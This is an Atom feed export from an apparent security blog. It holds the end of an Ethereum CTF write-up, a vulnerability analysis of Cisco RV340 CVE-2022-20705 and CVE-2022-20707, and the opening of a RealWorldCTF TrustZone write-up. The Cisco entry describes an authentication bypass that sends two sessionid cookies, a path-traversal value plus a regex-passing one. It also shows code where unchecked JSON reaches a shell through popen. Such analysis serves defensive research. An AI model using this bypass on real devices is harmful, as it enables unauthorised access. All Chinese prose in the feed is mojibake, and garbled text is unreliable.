=&gt;SimpleERC223Token</p></li><li><p>è®¾ç½® allowance :<code> allowance[from=player][msg.sender=player] =500000000000000000000000</code></p></li><li><p>å°† player çš„ Token å…¨éƒ¨è½¬åˆ°æ”»å‡»åˆçº¦ä¸Šï¼š</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simpleERC223Token_contract.functions.transferFrom(player_account.address,to&#x3D;attack_contract_address,value&#x3D;500000000000000000000000)</span><br></pre></td></tr></table></figure><ol start="5"><li>è°ƒç”¨æ”»å‡»åˆçº¦çš„ attack å‡½æ•°</li></ol><p>è¿™æ ·å°±å®Œæˆäº†æ”»å‡»æ­¥éª¤</p><p>è‡³æ­¤å°±å…¨éƒ¨åšå®Œäº†ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="Ethereum" scheme="https://bestwing.me/tags/Ethereum/"/>
    
    <category term="contracts" scheme="https://bestwing.me/tags/contracts/"/>
    
  </entry>
  
  <entry>
    <title>Pwning a Cisco RV340  æ¼æ´åˆ†æï¼ˆCVE-2022-20705 å’Œ CVE-2022-20707</title>
    <link href="https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html"/>
    <id>https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html</id>
    <published>2022-04-01T16:00:00.000Z</published>
    <updated>2022-04-03T11:30:35.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>åŸä½œè€…ç”¨åˆ°äº†å››ä¸ªæ¼æ´ï¼Œ æˆ‘è¿™é‡Œç®€å•åˆ†æå…¶ä¸­ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯  CVE-2022-20705 å’Œ CVE-2022-20707</p><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>å½±å“ç‰ˆæœ¬ï¼š RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img</p><p><a href="https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html">Relyze Software Limited - Advanced Software Analysis: Pwning a Cisco RV340 with a 4 bug chain exploit</a></p><h2 id="å›ºä»¶ä¸‹è½½"><a href="#å›ºä»¶ä¸‹è½½" class="headerlink" title="å›ºä»¶ä¸‹è½½"></a>å›ºä»¶ä¸‹è½½</h2><p><a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.26?catid=268437899">Software Download - Cisco Systems</a></p><h2 id="CVE-2022-20705-Improper-Session-Management-Vulnerability"><a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability" class="headerlink" title="CVE-2022-20705 Improper Session Management Vulnerability"></a>CVE-2022-20705 Improper Session Management Vulnerability</h2><p>Nginx é…ç½®ä¸å½“åŠ ä¸Š upload.cgi å¯¹ cookie ä¸¤è€…å¤„ç†ä¸ä¸€è‡´å¯¼è‡´çš„æˆæƒç»•è¿‡ã€‚</p><p>é¦–å…ˆ nginx å¯¹ upload æ¨¡å—çš„ session çš„å¤„ç†å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ cat web.upload.conf</span><br><span class="line">location &#x2F;form-file-upload &#123;</span><br><span class="line">include uwsgi_params;</span><br><span class="line">proxy_buffering off;</span><br><span class="line">uwsgi_modifier1 9;</span><br><span class="line">uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">uwsgi_read_timeout 3600;</span><br><span class="line">uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;upload &#123;</span><br><span class="line">set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny &#x3D; &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">upload_pass &#x2F;form-file-upload;</span><br><span class="line">upload_store &#x2F;tmp&#x2F;upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup 400 404 499 500-505;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œ è¿™é‡Œæ˜¯åˆ¤æ–­å¦‚æœ <code>/tmp/websession/token/$cookie_sessionid</code> æ–‡ä»¶å­˜åœ¨,åˆ™è¿”å›ã€‚  æ³¨æ„è¿™é‡Œçš„ <code>$cookie_sessionid</code> æ˜¯ç”±ç”¨æˆ·åœ¨ HTTP è¯·æ±‚ä¸­ä¼ å…¥çš„ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æ–‡ä»¶æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å­˜åœ¨ <code>../../</code>  ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬è·¨ç›®å½•æŒ‡å‘ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å°±å¯èƒ½é€ æˆæˆæƒç»•è¿‡ã€‚åƒè¿™é‡Œä½œè€…ä½¿ç”¨çš„æ˜¯  <code>../../../etc/firmware_version</code>ã€‚ </p><p>è™½ç„¶åœ¨ <code>upload.cgi</code> å¯¹ HTTP_COOKIE è¿›è¡Œäº†æ­£åˆ™æ ¡éªŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v16 = strcmp_1(REQUEST_URI, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (v16 != <span class="number">0</span>) &#123;</span><br><span class="line">    v17 = strcmp_1(REQUEST_URI, <span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (v17 == <span class="number">0</span> &amp;&amp; HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if the URI is /upload and we have a sessionid in the cookie</span></span><br><span class="line">        v18 = strlen_1(HTTP_COOKIE);</span><br><span class="line">        <span class="keyword">if</span> (v18 &lt; <span class="number">81</span>) &#123; <span class="comment">// sanity check sessionid characters</span></span><br><span class="line">            v19 = match_regex(<span class="string">&quot;^[A-Za-z0-9+=/]*$&quot;</span>, HTTP_COOKIE);</span><br><span class="line">            <span class="keyword">if</span> (v19 == <span class="number">0</span>) &#123;</span><br><span class="line">                v20 = StrBufToStr(local_0x44);</span><br><span class="line">                func_0x2684(HTTP_COOKIE, content_destination, content_option, content_pathparam, v20, content_cert_name, content_cert_type, content_password);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨ç¨‹åºæ²¡æœ‰è€ƒè™‘ç”¨æˆ·åœ¨  HTTP cookie ä¸­ä¼ å…¥å¤šä¸ª session_id çš„æƒ…å†µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if an cookie is available</span></span><br><span class="line">    StrBufSetStr(cookie_str, HTTP_COOKIE);</span><br><span class="line">    __s2 = StrBufToStr(cookie_str);</span><br><span class="line">    next_semicolon = strtok_r(__s2, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// start to split the semicolon deliminated cookie</span></span><br><span class="line">    HTTP_COOKIE = <span class="number">0</span>; <span class="comment">// this variable will become the sessionid string</span></span><br><span class="line">    <span class="keyword">while</span> (next_semicolon != <span class="number">0</span>) &#123;</span><br><span class="line">        sessionid = <span class="built_in">strstr</span>(next_semicolon, <span class="string">&quot;sessionid=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sessionid != <span class="number">0</span>) &#123; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">            HTTP_COOKIE = sessionid + <span class="number">10</span>; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        next_semicolon = strtok_r(<span class="number">0</span>, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// keep searching</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœè®¾ç½®ä¸¤ä¸ª seesionid ï¼Œ ç¬¬ä¸€ä¸ªä¸º <code>../../../etc/frimware_version</code> ï¼Œ ç¬¬äºŒä¸ªä¸ºå¯ä»¥é€šè¿‡æ­£åˆ™çš„æœ‰æ•ˆå­—ç¬¦ã€‚</p><p>æœ€åæˆ‘ä»¬å°±å¯ä»¥ç”¨æˆæƒçš„çŠ¶æ€è®¿é—® <code>upload.cgi</code> äº†ã€‚</p><h2 id="CVE-2022-20707-Command-Injection"><a href="#CVE-2022-20707-Command-Injection" class="headerlink" title="CVE-2022-20707 Command Injection"></a>CVE-2022-20707 Command Injection</h2><p>ä½œè€…åœ¨ <code>upload.cgi</code> é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªå‘½ä»¤æ³¨å…¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (json_obj != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">json_str = json_object_to_json_string(json_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;buff, <span class="string">&quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;</span>, v3, sessionid, json_str);</span><br><span class="line"></span><br><span class="line">debug(<span class="string">&quot;curl_cmd=%s&quot;</span>, &amp;buff);</span><br><span class="line"></span><br><span class="line">__stream = popen(&amp;buff, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__stream != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">fread_1(&amp;buff[<span class="number">2048</span>], <span class="number">2048</span>, <span class="number">1</span>, __stream);</span><br><span class="line"></span><br><span class="line">fclose_1(__stream);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„çš„ json_str æ²¡æœ‰æ ¡éªŒï¼Œ ä¼šé€ æˆå‘½ä»¤æ³¨å…¥ã€‚</p><h2 id="Related-vulnerability-tracking"><a href="#Related-vulnerability-tracking" class="headerlink" title="Related vulnerability tracking"></a>Related vulnerability tracking</h2><p>æˆ‘ä»¬ä¹‹å‰åˆ†æäº† CVE-2022-20699-cisco-RV34X çš„æ—¶å€™ï¼Œæ³¨æ„åˆ°ä¸€ä¸ªè¡¥ä¸ï¼Œ ä¿®è¡¥äº† Nginx çš„é…ç½®ä¸å½“çš„æ¼æ´ã€‚ç„¶åä»Šå¤©å’Œ @leommxj ä¸€èµ·è¿½æº¯äº†ä¸€ä¸‹ cisco çš„ä¿®è¡¥å†å²ã€‚</p><h3 id="Firmware-version-1-0-03-19"><a href="#Firmware-version-1-0-03-19" class="headerlink" title="Firmware version 1.0.03.19"></a>Firmware version 1.0.03.19</h3><p>nginx å¯¹è°ƒç”¨ upload.cgi æ²¡æœ‰ä»»ä½•çš„æ ¡éªŒï¼Œ å› æ­¤å¯ä»¥è®¿é—® upload.cgi ï¼Œ è¿˜å‡ºä¸¤ä¸ªæ¼æ´ #CVE-2020-3451 #CVE-2020-3453</p><p>ç›¸å…³çš„æ¼æ´ä¿¡æ¯ä¸º:</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1100/">ZDI-20-1100 | Zero Day Initiative</a><br><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1101/">ZDI-20-1101 | Zero Day Initiative</a><br><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-osinj-rce-pwTkPCJv">Cisco Small Business RV340 Series Routers Command Injection and Remote Code Execution Vulnerabilities</a></p><h3 id="Firmware-version-1-0-03-21"><a href="#Firmware-version-1-0-03-21" class="headerlink" title="Firmware version 1.0.03.21"></a>Firmware version 1.0.03.21</h3><p>ä¹‹åæœ‰ä¸ªè€å“¥å‘ç° cisco è™½ç„¶åŠ è¡Œäº†æˆæƒæ ¡éªŒï¼Œä½†æ˜¯åŠ å¾—ä¸è¡Œã€‚</p><p>è¿™åŠ ä¹‹å‰å’ŒåŠ ä¹‹åçš„ diffï¼š<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png"></a></p><p>è¿™ä¸ªä¿®å¤æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·ã€‚é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œä»»ä½•éç©ºçš„æˆæƒæ ‡å¤´éƒ½ä¼šå°† $deny è®¾ç½®ä¸ºâ€œ0â€ã€‚å› æ­¤ï¼Œä»å­—é¢ä¸Šå‘é€ä»»ä½•çœ‹èµ·æ¥æœ‰æ•ˆçš„æˆæƒæ ‡å¤´ä½œä¸ºè¯·æ±‚/ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å°†ç»•è¿‡æˆæƒæ£€æŸ¥ã€‚</p><p>ç›¸å…³æ¼æ´ä¿¡æ¯ä¸ºï¼š </p><p>#CVE-2021-1473 #CVE-2021-1472<br><a href="https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/">Advisory: Cisco RV34X Series - Authentication Bypass and Remote Command Execution - IoT Inspector (iot-inspector.com)</a></p><h3 id="Firmware-version-1-0-03-22"><a href="#Firmware-version-1-0-03-22" class="headerlink" title="Firmware version 1.0.03.22"></a>Firmware version 1.0.03.22</h3><p>ç„¶åè¿™ä¸ªç‰ˆæœ¬ä¹‹åå»æ‰äº†ä¸Šå›¾ 13 è¡Œçš„ nginx é…ç½®ã€‚ä½†æ˜¯å‡ºç°äº†æ­¤æ¬¡ <a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> è¿™ä¸ªæ¼æ´äº†ã€‚</p><h3 id="Firmware-version-1-0-0-3-26"><a href="#Firmware-version-1-0-0-3-26" class="headerlink" title="Firmware version 1.0.0.3.26"></a>Firmware version 1.0.0.3.26</h3><p>æœ€æ–°ç‰ˆæœ¬çš„ nginx ç°åœ¨é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;upload &#123;</span><br><span class="line">    set $deny 0;</span><br><span class="line"></span><br><span class="line">    if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($cookie_sessionid ~* &quot;^[a-f0-9]&#123;64&#125;&quot;) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($deny !&#x3D; &quot;012&quot;) &#123;</span><br><span class="line">            return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¢åŠ äº†ä¸€ä¸ªæ­£åˆ™åˆ¤æ–­ã€‚</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>ä¸€ä¸ªç‚¹æœ‰æ„æ€çš„æ˜¯ï¼Œ è¿™<a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> ä½œè€… å’Œ <a href="#Firmware-version-1-0-03-21">CVE-2021-1473</a> ä½œè€…ç”¨åˆ°çš„å‘½ä»¤æ³¨å…¥å’Œæˆ‘å½“æ—¶æŒ–åˆ°<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv340-cmdinj-rcedos-pY8J3qfy">ä¸¤ä¸ªç¼–å·</a> #CVE-2021-1609 å’Œ #CVE-2021-1610  çš„æ¼æ´ç‚¹åœ¨ä¸€è¡Œä»£ç é‡Œï¼Œè¿™æ„æ€å°±æ˜¯è¿™è¡Œä»£ç ä¸€å…±å‡ºäº† 4 ä¸ªæ¼æ´ç¼–å·</p><p>ä»¥åæŒ– IoT æ¼æ´ä¹Ÿè¦å¤šæ³¨æ„ä¸€ä¸‹ web ç›¸å…³çš„é…ç½®äº†ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2022-20705" scheme="https://bestwing.me/tags/CVE-2022-20705/"/>
    
    <category term="CVE-2022-20707" scheme="https://bestwing.me/tags/CVE-2022-20707/"/>
    
    <category term="cisco" scheme="https://bestwing.me/tags/cisco/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF-4th TrustZone challenge Writeup</title>
    <link href="https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"/>
    <id>https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html</id>
    <published>2022-01-23T16:00:00.000Z</published>
    <updated>2022-01-25T05:25:15.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>ç¬¬å››å±Š realworldctf æˆ‘å’Œ @chennan å‡ºäº†ä¸‰ä¸ªé¢˜ç›®ï¼Œåˆ†åˆ«æ˜¯  <code>Trust or Not</code>, <code>UnTrustZone</code> and <code>Wheels on the Bus</code>ï¼Œ å…¶ä¸­   <code>Trust or Not</code>, <code>UnTrustZone</code>  æ˜¯å’Œ TrustZone ç›¸å…³çš„é¢˜ç›®ã€‚</p><h2 id="TrustZone-challenge"><a href="#TrustZone-challenge" class="headerlink" title="TrustZone challenge"></a>TrustZone challenge</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" title="image-20220113181523560" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" alt="image-20220113181523560"></a></p><p>TrustZoneæ˜¯åŸºäºç¡¬ä»¶çš„å®‰å…¨åŠŸèƒ½ï¼Œå®ƒé€šè¿‡å¯¹åŸæœ‰ç¡¬ä»¶æ¶æ„è¿›è¡Œä¿®æ”¹ï¼Œåœ¨å¤„ç†å™¨å±‚æ¬¡å¼•å…¥äº†ä¸¤ä¸ªä¸åŒæƒé™çš„ä¿æŠ¤åŸŸâ€”â€”å®‰å…¨ä¸–ç•Œå’Œæ™®é€šä¸–ç•Œï¼Œä»»ä½•æ—¶åˆ»å¤„ç†å™¨ä»…åœ¨å…¶ä¸­çš„ä¸€ä¸ªç¯å¢ƒå†…è¿è¡Œã€‚åŒæ—¶è¿™ä¸¤ä¸ªä¸–ç•Œå®Œå…¨æ˜¯ç¡¬ä»¶éš”ç¦»çš„ï¼Œå¹¶å…·æœ‰ä¸åŒçš„æƒé™ï¼Œæ­£å¸¸ä¸–ç•Œä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºæˆ–æ“ä½œç³»ç»Ÿè®¿é—®å®‰å…¨ä¸–ç•Œçš„èµ„æºå—åˆ°ä¸¥æ ¼çš„é™åˆ¶ï¼Œåè¿‡æ¥å®‰å…¨ä¸–ç•Œä¸­è¿è¡Œçš„ç¨‹åºå¯ä»¥æ­£å¸¸è®¿é—®æ­£å¸¸ä¸–ç•Œä¸­çš„èµ„æºã€‚è¿™ç§ä¸¤ä¸ªä¸–ç•Œä¹‹é—´çš„ç¡¬ä»¶éš”ç¦»å’Œä¸åŒæƒé™ç­‰å±æ€§ä¸ºä¿æŠ¤åº”ç”¨ç¨‹åºçš„ä»£ç å’Œæ•°æ®æä¾›äº†æœ‰æ•ˆçš„æœºåˆ¶ï¼šé€šå¸¸æ­£å¸¸ä¸–ç•Œç”¨äºè¿è¡Œå•†å“æ“ä½œç³»ç»Ÿï¼ˆä¾‹å¦‚Androidã€iOSç­‰ï¼‰ï¼Œè¯¥æ“ä½œç³»ç»Ÿæä¾›äº†æ­£å¸¸æ‰§è¡Œç¯å¢ƒï¼ˆRich Execution Environmentï¼ŒREEï¼‰ï¼›å®‰å…¨ä¸–ç•Œåˆ™å§‹ç»ˆä½¿ç”¨å®‰å…¨çš„å°å†…æ ¸ï¼ˆTEE-kernelï¼‰æä¾›å¯ä¿¡æ‰§è¡Œç¯å¢ƒï¼ˆTrusted Execution Environmentï¼ŒTEEï¼‰ï¼Œæœºå¯†æ•°æ®å¯ä»¥åœ¨TEEä¸­è¢«å­˜å‚¨å’Œè®¿é—®ã€‚</p><h3 id="Trust-or-Not"><a href="#Trust-or-Not" class="headerlink" title="Trust or Not"></a>Trust or Not</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Trust or Not</p><p>Score: <em>357</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Reverse&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>We have lost some of our files and cannot retrieve the plaintext data originally stored.</p><p>Hint: flag file is stored in <code>/data/tee/2</code> securely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc 47.242.114.24 7788</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/Trust_or_not_fa542592446c43678f685913495da668.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>è¦è§£å†³è¿™ä¸ªé¢˜ç›®ï¼Œé¦–å…ˆè¦äº†è§£ä»€ä¹ˆæ˜¯å®‰å…¨å­˜å‚¨ã€‚ æ•°æ®è¦ä¹ˆä»¥æŸç§åŠ å¯†/æˆæƒçš„æ–¹å¼å­˜å‚¨åœ¨linuxæ–‡ä»¶ç³»ç»Ÿ<code>/data/tee</code>ä¸­ï¼Œè¦ä¹ˆå­˜å‚¨åœ¨Emmc RPMBï¼ˆReplay Protected Memory Blockï¼‰åˆ†åŒºä¸­ã€‚è¿™æ¬¡çš„ç›¸å…³é¢˜ç›®ä¸»è¦ä½¿ç”¨äº† <code>OP-TEE</code>çš„å¼€æºé¡¹ç›®ï¼Œå…¶æ›´è¯¦ç»†çš„ä¿¡æ¯å¯ä»¥åœ¨<a href="https://github.com/ForgeRock/optee-os/blob/master/documentation/secure_storage.md">OP-TEEæ–‡æ¡£</a> ä¸­æ‰¾åˆ°ã€‚</p><p> **Hardware Unique Key ï¼ˆHUKï¼‰ ** </p><p>å¤§å¤šæ•°è®¾å¤‡éƒ½æœ‰æŸç§ç¡¬ä»¶å”¯ä¸€å¯†é’¥ï¼ˆHUKï¼‰ï¼Œä¸»è¦ç”¨äºæ´¾ç”Ÿå…¶ä»–å¯†é’¥ã€‚ä¾‹å¦‚ï¼Œå½“æ´¾ç”Ÿå¯†é’¥ç”¨äºå®‰å…¨å­˜å‚¨ç­‰æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ HUK æ´¾ç”Ÿã€‚HUK çš„é‡è¦ä¹‹å¤„åœ¨äºå®ƒéœ€è¦å¾—åˆ°å¾ˆå¥½çš„ä¿æŠ¤ï¼Œå¹¶ä¸”åœ¨æœ€å¥½çš„æƒ…å†µä¸‹ï¼ŒHUK æ°¸è¿œä¸åº”è¯¥ç›´æ¥ä»è½¯ä»¶è¯»å–ï¼Œç”šè‡³ä¸åº”è¯¥ä»å®‰å…¨æ–¹é¢è¯»å–ã€‚æœ‰ä¸åŒçš„è§£å†³æ–¹æ¡ˆï¼ŒåŠ å¯†åŠ é€Ÿå™¨å¯èƒ½æ”¯æŒå®ƒï¼Œæˆ–è€…ï¼Œå®ƒå¯èƒ½æ¶‰åŠå¦ä¸€ä¸ªå®‰å…¨çš„åå¤„ç†å™¨ã€‚</p><p> <strong>Secure Storage Key ï¼ˆSSKï¼‰</strong> </p><p>SSKæ˜¯æ¯ä¸ªè®¾å¤‡çš„å¯†é’¥ï¼Œåœ¨OP-TEEå¯åŠ¨æ—¶ç”Ÿæˆå¹¶å­˜å‚¨åœ¨å®‰å…¨å†…å­˜ä¸­ã€‚SSKç”¨äºæ´¾ç”ŸTAå­˜å‚¨å¯†é’¥ï¼ˆTSKï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSK &#x3D; HMACSHA256Â (HUK, Chip ID || â€œstatic stringâ€)</span><br></pre></td></tr></table></figure><p>è·å–ç¡¬ä»¶å”¯ä¸€å¯†é’¥ï¼ˆHUKï¼‰å’ŒèŠ¯ç‰‡IDçš„åŠŸèƒ½å–å†³äºå¹³å°å®ç°ã€‚ç›®å‰ï¼ŒOP-TEE 